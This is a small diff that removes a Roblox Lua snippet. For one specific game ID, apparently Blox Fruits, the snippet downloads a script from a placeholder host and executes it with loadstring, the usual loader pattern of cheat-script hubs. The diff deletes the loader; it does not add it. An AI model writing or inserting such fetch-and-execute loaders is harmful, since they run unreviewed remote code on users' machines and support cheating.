@@ -1,8 +1,0 @@
-if game.GameId == 994732206 then
- local success, result = pcall(function()
-  loadstring(game:HttpGet("https://doesnotexist.com/uuid=4444-4444-4444-4444/astral-hub/blox-fruis")()
- end)
- if not success then
-  print("Erro ["..result.."]")
- end
-end
